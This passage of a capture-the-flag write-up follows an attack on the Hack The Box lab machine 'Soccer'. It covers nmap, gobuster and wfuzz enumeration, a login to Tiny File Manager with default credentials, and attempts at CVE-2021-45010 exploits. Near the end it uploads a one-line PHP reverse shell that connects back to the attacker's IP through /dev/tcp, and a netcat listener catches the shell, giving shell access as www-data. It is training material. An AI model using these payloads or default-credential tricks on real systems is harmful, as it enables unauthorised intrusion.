ml\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\ SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F, SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2 SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 43.06 secondsAnd let's move immediately to the portal (port 80), which will certainly be our access point, of course, not before adding the "soccer.htb" domain to our /etc/hosts file.A football portal.And here, a sore point about me that I have to tell to allow those who have been following me for many time to get to know me better. Well, although football is the national sport of my homeland, ahimè, I don't follow football. Well yes, swimming against the tide, unfortunately as a bad Italian that I am, I'm not that passionate about sport and above all about football which I really don't like. After the digression, let's go back to our BOX.There is nothing particular from wappalyzer.A simple gobuster scan for hidden routes.┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox] └─$ gobuster dir -u http://soccer.htb -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.4 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.4 [+] Timeout: 10s =============================================================== 2023/01/06 12:40:23 Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 162] /.htaccess (Status: 403) [Size: 162] /.htpasswd (Status: 403) [Size: 162] /index.html (Status: 200) [Size: 6917] Progress: 4611 / 4615 (99.91%) =============================================================== 2023/01/06 12:41:16 Finished ===============================================================Again, nothing interesting. Let's move on to the subdomains using wfuzz.┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox] └─$ wfuzz -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -H "Host: FUZZ.soccer.htb" --hc "301" http://soccer.htb /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://soccer.htb/ Total requests: 5000 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000002700: 400 7 L 12 W 166 Ch "m." 000002795: 400 7 L 12 W 166 Ch "ns2.cl.bellsouth.net." 000002883: 400 7 L 12 W 166 Ch "ns1.viviotech.net." 000002885: 400 7 L 12 W 166 Ch "ns2.viviotech.net." 000003050: 400 7 L 12 W 166 Ch "ns3.cl.bellsouth.net." 000004081: 400 7 L 12 W 166 Ch "ferrari.fortwayne.com." 000004083: 400 7 L 12 W 166 Ch "quatro.oweb.com." 000004082: 400 7 L 12 W 166 Ch "jordan.fortwayne.com." Total time: 59.23708 Processed Requests: 5000 Filtered Requests: 4992 Requests/sec.: 84.40657The BOX appears to be overbearing, but let's broaden the search with a larger dictionary.┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox] └─$ gobuster dir -u http://soccer.htb -w /usr/share/dirb/wordlists/big.txt =============================================================== Gobuster v3.4 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://soccer.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.4 [+] Timeout: 10s =============================================================== 2023/01/06 13:30:25 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 162] /.htaccess (Status: 403) [Size: 162] /tiny (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/] Progress: 20463 / 20470 (99.97%) =============================================================== 2023/01/06 13:34:15 Finished ===============================================================OK, that's better.Let's try to understand what we are dealing with, just a simple search is this interesting filemanager emerges from the depths of github.Tiny File ManagerWeb based File Manager in PHP, Manage your files efficiently and easily with Tiny File ManagerCCP Programmers | ccpprogrammersgmail.comSearch now for exploits.That seems to be fine, except that all exploits require user credentials. I discovered the administrator's default user credentials, which surely have been changed... like getting a lollipop from a child! Perfect, I can go back to the exploits I found and start trying them until I find what works for me.Tiny File Manager 2.4.6 - Remote Code Execution (RCE)Tiny File Manager 2.4.6 - Remote Code Execution (RCE). CVE-2021-45010CVE-2021-40964 . webapps exploit for PHP platformExploit DatabaseFEBIN MON SAJII had some problems at the beginning with the downloaded file, but I solved it with the dostounix command, then renamed the file, added execute permissions, installed jq and finally try the exploit.┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.194 - Soccer (lin)/attack/expl] └─$ ./50828.sh http://soccer.htb/tiny admin admin@123 /usr/bin/curl [✔] Curl found! /usr/bin/jq [✔] jq found! [-] Logn Failed! [-] Can't find WEBROOT! Using default /var/www/html [-] File Upload Unsuccessful! Exiting!I tried to search for the same exploit on github and luckily for me. I found it.GitHub - febinrev/tinyfilemanager-2.4.3-exploit: A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project’s Tiny File Manager <= 2.4.6 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server.A Path traversal vulnerability in the file upload functionality in tinyfilemanager.php in Tiny File Manager Project&#39;s Tiny File Manager &lt;= 2.4.6 allows remote attackers with valid user accou...GitHubfebinrevBut the same error occurs. I studied the exploit and realized that it does nothing but upload a file. I tried to figure out where the flow gets stuck by running the script commands manually.┌──(in7rud3r㉿kali-muletto)-[~/…/attack/expl/git/tinyfilemanager-2.4.3-exploit] └─$ curl "http://soccer.htb/tiny" -X POST -s -d "fm_usr=admin&fm_pwd=admin@123" -i HTTP/1.1 301 Moved Permanently Server: nginx/1.18.0 (Ubuntu) Date: Wed, 25 Jan 2023 21:08:51 GMT Content-Type: text/html Content-Length: 178 Location: http://soccer.htb/tiny/ Connection: keep-alive <html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>nginx/1.18.0 (Ubuntu)</center> </body> </html> ┌──(in7rud3r㉿kali-muletto)-[~/…/attack/expl/git/tinyfilemanager-2.4.3-exploit] └─$ curl "http://soccer.htb/tiny/" -X POST -s -d "fm_usr=admin&fm_pwd=admin@123" -i HTTP/1.1 302 Found Server: nginx/1.18.0 (Ubuntu) Date: Wed, 25 Jan 2023 21:09:02 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive Set-Cookie: filemanager=su0addf783d7l7cg0jiaq7g5iq; path=/ Location: http://soccer.htb/tiny/tinyfilemanager.php?p=This cleared things up a bit for me. Apparently, calling the URL without completing it with the "slash" returns an error code 301 (moved permanently) to the same address but with the final "slash" and, again, once the URL is corrected, a new redirect (302 this time) is carried out (too bad that if not specified, the curls do not follow the redirects due to 301 and 302 errors).┌──(in7rud3r㉿kali-muletto)-[~/…/attack/expl/git/tinyfilemanager-2.4.3-exploit] └─$ ./exploit.sh http://soccer.htb/tiny/tinyfilemanager.php admin admin@123 /usr/bin/curl [✔] Curl found! /usr/bin/jq [✔] jq found! [+] Login Success! Cookie: filemanager=16lo7imigtdi84g10i8isf8taa [*] Try to Leak Web root directory path [+] Found WEBROOT directory for tinyfilemanager using full path disclosure bug : /var/www/html/tiny/ [-] File Upload Unsuccessful! Exiting!Better, but there still seems to be something wrong. Let's try the other script again by adjusting the shot there, too.┌──(in7rud3r㉿kali-muletto)-[~/…/attack/expl/git/tinyfilemanager-2.4.3-exploit] └─$ python tiny_file_manager_exploit.py http://soccer.htb/tiny/tinyfilemanager.php admin admin@123 CVE-2021-45010: Tiny File Manager <= 2.4.3 Authenticated RCE Exploit. Vulnerability discovered by Febin Exploit Author: FEBIN [+] Leak in the webroot direcory path to upload shell. [+] WEBROOT found: /var/www/html/tiny [+] Trying to upload pwn_749599792829250560.php to /var/www/html/tiny directory... {"status":"error","info":"The specified folder for upload isn't writeable."} [-] No Success response. Files does not seem to be uploaded successfully. Exiting... Exited.Nothing. At this point, I tried to upload manually, but I tried with php reverse shells. Obviously, some time has passed before I find the right one.┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.194 - Soccer (lin)/attack/expl] └─$ echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.145/4444 0>&1'\");?>" > shell_in7.phpI uploaded the file and started the shell from the link where it was saved (http://soccer.htb/tiny/uploads/shell_in7.php). Et voilà, we are inside.┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.194 - Soccer (lin)/attack/expl] └─$ nc -lvp 4444 listening on [any] 4444 ... connect to [10.10.14.145] from soccer.htb [10.10.11.194] 53458 bash: cannot set terminal process group (1039): Inappropriate ioctl for device bash: no job control in this shell www-data@soccer:~/html/tiny/uploads$ Of course, I'm the user running the portal instance (www-data), so there's little I can do yet.www-data@soccer:/$ cd home cd home www-data@soccer:/home$ ls -la ls -la total 12 drwxr-xr-x 3 root root 4096 Nov 17 09:25 . drwxr-xr-x 21 root root 4096 Dec 1 18:51 .. drwxr-xr-x 3 player player 4096 Nov 28 22:12 player www-data@soccer:/home$ cd player cd player www-data@soccer:/home/player$ ls -la ls '''
